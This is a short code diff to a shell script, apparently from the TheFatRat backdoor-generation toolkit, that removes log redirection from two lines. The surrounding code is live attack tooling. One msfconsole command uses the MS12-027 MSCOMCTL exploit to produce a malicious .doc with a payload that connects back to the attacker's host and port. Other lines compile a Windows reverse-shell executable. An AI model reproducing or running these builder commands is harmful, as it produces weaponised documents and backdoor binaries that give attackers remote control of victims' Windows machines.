@@ -734,7 +734,7 @@ echo ""
 					gboor
 					spinlong
 					echo ""
-         				xterm -T " TheFatRat < DOC BUILDER > " -geometry 110x23 -e "$msfconsole -x 'use exploit/windows/fileformat/ms12_027_mscomctl_bof; set payload $payloads ; set FILENAME $fira.doc; set lhost $yourip ; set lport $yourport; exploit; exit -y'" >> $log
+         				xterm -T " TheFatRat < DOC BUILDER > " -geometry 110x23 -e "$msfconsole -x 'use exploit/windows/fileformat/ms12_027_mscomctl_bof; set payload $payloads ; set FILENAME $fira.doc; set lhost $yourip ; set lport $yourport; exploit; exit -y'"
          				echo ""
          				mv ~/.msf4/local/$fira.doc $path/output/$fira.doc 
          				echo -e $okegreen""
@@ -1426,7 +1426,7 @@ echo -e $red"  	     Powershell$cyan Injection attacks on any$red Windows Platfo
         echo ' }' >> $reverse1
         echo ' return 0;' >> $reverse1
         echo '}' >> $reverse1
-        $COMPILER $reverse1 -o output/$fira.exe -lws2_32 -mwindows >> $log
+        $COMPILER $reverse1 -o output/$fira.exe -lws2_32 -mwindows
 	      echo
         echo -e $yellow " [+]"$okegreen"Compiling Binary Done  ";tput sgr0
         rm $reverse1
